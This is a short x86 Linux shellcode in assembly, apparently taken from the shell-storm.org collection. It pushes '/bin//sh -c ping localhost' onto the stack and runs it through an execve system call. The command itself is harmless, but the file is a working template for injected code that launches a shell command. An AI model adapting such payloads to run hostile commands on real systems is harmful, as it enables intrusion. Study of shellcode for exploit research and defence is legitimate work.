; Content:	extracted assembly code (ping localhost) from http://shell-storm.org/shellcode/files/shellcode-632.php
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	10/2017
;

global	_start			

section	.text

_start:

	push	0xb	
	pop	eax
	cdq				
	push	edx
	push	0x20207473
	push	0x6f686c61
	push	0x636f6c20
	push	0x676e6970
	mov	esi, esp
	push	edx
	push	word 0x632d
	mov	ecx, esp
	push	edx
	push	0x68732f2f
	push	0x6e69622f
	mov	ebx, esp
	push	edx
	push	esi
	push	ecx
	push	ebx
	mov	ecx, esp
	int	0x80
